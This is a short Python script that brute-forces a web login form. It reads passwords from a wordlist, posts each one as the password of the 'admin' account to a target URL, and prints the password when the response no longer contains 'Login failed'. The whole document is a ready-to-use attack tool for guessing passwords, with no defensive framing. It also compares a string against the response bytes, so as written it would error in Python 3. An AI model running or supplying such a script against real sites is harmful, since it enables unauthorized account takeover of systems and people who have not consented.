import requests

target_url = ""  #your target url
data_dict = {"username": "admin", "password": "", "Login": "submit"} #data_dict based on the form input fields, u cn see it by inspect on it

with open("your_wordlistfile_path", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the Password----> " + word)
            exit()
print("[+] Reached End of line, Sorry didn't get the password from this wordlist")
